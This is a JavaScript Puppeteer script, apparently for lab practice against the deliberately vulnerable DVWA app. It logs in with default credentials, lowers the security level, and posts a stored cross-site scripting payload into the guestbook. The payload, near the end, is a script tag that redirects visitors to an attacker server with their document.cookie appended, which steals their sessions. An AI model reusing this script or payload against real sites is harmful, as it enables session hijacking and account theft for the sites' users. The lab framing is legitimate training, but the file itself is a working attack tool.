const puppeteer = require("puppeteer")
const {
    targetURL,
    attackerServer,
    Levels
} = require('./config.js')

// To delay the time for scrapingbot to load contents
const delay = (time) => {
    return new Promise(function (resolve) {
        setTimeout(resolve, time)
    });
}
/**
 * This is to practice auto scraping for Cross Site Scripting (Stored).
 *  
 * @param {str} targetURL DVWA URL locally running in your computer
 * @param {str} attacks a string (script tags)
 * @param {Levels} level Enum class (Levels) declared on config.js
 */
const xssAutoStored = async (targetURL, attack, level) => {
    /**
     * #1. Launch a headless Chromium for scraping.
     * */

    // Launch a headless Chromium for scraping.
    const browser = await puppeteer.launch({
        headless: false
    })
    const page = await browser.newPage();
    await page.goto(targetURL);


    /** 
     * #2. On the target URL, it needs to be logged-in with the below information.
     * username : admin, password : password.
     * Login and add delay with 1000 millisecond.
     * */

    await page.$eval('input[name=username]', el => el.value = 'admin')
    await page.$eval('input[name=password]', el => el.value = 'password')
    await delay(3000);
    await page.click('input[type="submit"]');


    /**
     * #3. There are total 4 levels on the DVWA webpage.
     * The level should be set to the same value of the passed parameter (level)
     * Go to the DVWA Security page, select level,submit it.
     */

    await page.click('#main_menu_padded > ul:nth-child(3) > li:nth-child(1) > a')
    await page.select('#main_body > div > form > select', level)
    await delay(3000);
    await page.click('input[type="submit"]');
    await delay(2000);


    /**
     * #4. Since XSS stored attack leaves the result of the previous history,
     * it should be removed. 
     * Go to the Setup/Reset DB page, click the create/reset Database button
     * add delay with 1000 millisecond.
     */

    await page.click('#main_menu_padded > ul:nth-child(1) > li:nth-child(3) > a');
    await delay(1000);
    await page.click('input[type="submit"]');
    await delay(1000);



    /**
     * #5. Try attack
     * Go to the XSS(Stored) page, 
     * You should fill out both fields (Name and Message)
     * For the Name field, you can put any word ("HACKED!" or your name, or "Test")
     * For the Message field, you should pass the parameter (attack)
     * After clikc "Sign Guest" and delay 1000, 
     * Visit the targetURL page again. Go to the XSS(Stored) page. 
     * 
     */

    console.log(`Attack Start`)
    await page.click('#main_menu_padded > ul:nth-child(2) > li:nth-child(12)')
    await page.$eval('input[name=txtName]', el => el.value = 'HACKED!')
    await page.$eval('textarea[name=mtxMessage]', (el, attack) => {
        el.value = attack
    }, attack)



    console.log("Script is Stored")
    await page.click('#main_body > div > div.vulnerable_code_area > form > table > tbody > tr:nth-child(3) > td:nth-child(2) > input[type=submit]:nth-child(1)')
    await delay(1000);


    await page.goto(targetURL);
    await page.click('#main_menu_padded > ul:nth-child(2) > li:nth-child(12)')

    // Close the browser
    await browser.close();
}

attacksXssStored = "<script>window.location='" + attackerServer + "/session/'+document.cookie</script>",

    xssAutoStored(targetURL, attacksXssStored, Levels.low)